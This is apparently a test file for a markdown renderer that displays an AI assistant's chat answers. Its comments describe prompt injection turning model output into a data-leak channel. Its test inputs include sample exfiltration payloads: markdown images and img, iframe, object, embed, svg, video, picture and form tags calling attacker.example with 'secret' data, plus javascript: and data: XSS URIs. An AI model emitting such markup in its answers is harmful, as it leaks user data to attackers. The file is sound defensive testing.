import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './markdown';

// Model output is untrusted: surfaces that render it read job descriptions, browsed pages and
// other text an attacker controls end to end, so anything the model writes may be an
// attacker's words in the model's mouth. Nothing it emits may cause the browser to
// issue a request — a rendered image is a GET the viewer never asked to make, and it
// carries whatever the model was holding.
describe('renderMarkdown — request-triggering markup', () => {
  it('drops a markdown image', () => {
    const html = renderMarkdown('![x](https://attacker.example/leak?d=secret)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  it('drops a raw HTML image', () => {
    const html = renderMarkdown('<img src="https://attacker.example/p.gif">');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  // The elements a forbidden-tags list tends to miss. Each one fetches.
  it.each([
    ['svg use', '<svg><use href="https://attacker.example/u"></use></svg>'],
    ['object', '<object data="https://attacker.example/o"></object>'],
    ['embed', '<embed src="https://attacker.example/e">'],
    ['iframe', '<iframe src="https://attacker.example/i"></iframe>'],
    ['video poster', '<video poster="https://attacker.example/v"></video>'],
    ['picture source', '<picture><source srcset="https://attacker.example/s"></picture>'],
    ['form', '<form action="https://attacker.example/f"><button>go</button></form>'],
  ])('drops %s', (_name, input) => {
    expect(renderMarkdown(input)).not.toContain('attacker.example');
  });

  // The channel is open on every re-render, not only the settled turn: the chat
  // re-renders the answer on each streamed token, so an image would fire the moment
  // its syntax closed — mid-answer, before anyone could read what was happening.
  //
  // The assertion is about markup that FETCHES, not about the host string: on a prefix
  // where the image syntax has not closed yet, marked leaves it as literal text, and a
  // URL sitting in a text node is inert.
  it('emits no fetching markup from any prefix of a streamed answer', () => {
    const answer = 'Here is what I found.\n\n![x](https://attacker.example/leak?d=secret)\n\nDone.';
    for (let i = 1; i <= answer.length; i++) {
      const html = renderMarkdown(answer.slice(0, i));
      expect(html, `prefix of length ${i}`).not.toContain('<img');
      expect(html, `prefix of length ${i}`).not.toContain('src=');
    }
  });
});

describe('renderMarkdown — URI schemes', () => {
  it.each(['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'])(
    'refuses the %s scheme',
    (uri) => {
      const html = renderMarkdown(`[click](${uri})`);
      expect(html).not.toContain('href="' + uri);
      expect(html).toContain('click');
    },
  );
});

// The policy has to leave the assistant able to write a readable answer — the prompt
// asks it for short paragraphs, grouped findings and links.
describe('renderMarkdown — prose survives', () => {
  it('keeps headings, lists, emphasis, code and tables', () => {
    const html = renderMarkdown(
      '## Findings\n\n- **bold** and *italic* and ~~struck~~\n- `inline`\n\n```go\nfmt.Println()\n```\n\n| a | b |\n| --- | --- |\n| 1 | 2 |\n',
    );
    expect(html).toContain('<h2>Findings</h2>');
    expect(html).toContain('<li>');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<em>italic</em>');
    expect(html).toContain('<del>struck</del>');
    expect(html).toContain('<code>inline</code>');
    expect(html).toContain('<pre>');
    expect(html).toContain('fmt.Println()');
    expect(html).toContain('<table>');
    expect(html).toContain('<td>1</td>');
  });

  it('opens a link in a new tab', () => {
    const html = renderMarkdown('[freehire](https://freehire.me/jobs)');
    expect(html).toContain('href="https://freehire.me/jobs"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('keeps a mailto link', () => {
    expect(renderMarkdown('[mail](mailto:a@b.example)')).toContain('href="mailto:a@b.example"');
  });

  // Relative URLs are same-origin by definition, so they carry nothing off the site.
  // Pinning schemes too tightly drops their href and leaves a dead link that looks fine.
  it.each(['/my/profile', '#section', 'jobs/go-dev'])('keeps the relative link %s', (href) => {
    expect(renderMarkdown(`[go](${href})`)).toContain(`href="${href}"`);
  });
});
